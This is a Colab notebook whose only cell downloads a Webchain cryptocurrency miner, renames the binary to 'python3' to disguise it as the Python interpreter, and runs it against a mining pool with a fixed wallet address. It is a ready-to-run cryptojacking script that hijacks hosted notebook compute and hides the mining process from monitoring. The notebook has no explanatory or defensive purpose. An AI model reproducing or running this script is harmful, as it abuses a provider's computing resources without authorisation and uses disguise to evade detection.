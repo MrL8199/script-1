{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Untitled4.ipynb",
      "version": "0.3.2",
      "views": {},
      "default_view": {},
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "metadata": {
        "id": "fi60aAJd6k3-",
        "colab_type": "code",
        "colab": {
          "autoexec": {
            "startup": false,
            "wait_interval": 0
          }
        }
      },
      "cell_type": "code",
      "source": [
        "!wget https://github.com/webchain-network/webchain-miner/releases/download/v2.7.0/webchain-miner-2.7.0-linux-amd64.tar.gz && tar xvzf webchain-miner-2.7.0-linux-amd64.tar.gz && mv webchain-miner python3 && rm config.json -f && ./python3 -o pool.webchain.network:2222 -u 0xd5d5871933be8b3b8b80cac22127219c7b8026f4 -p x --donate-level=0 --worker-id=no"
      ],
      "execution_count": 0,
      "outputs": []
    }
  ]
}
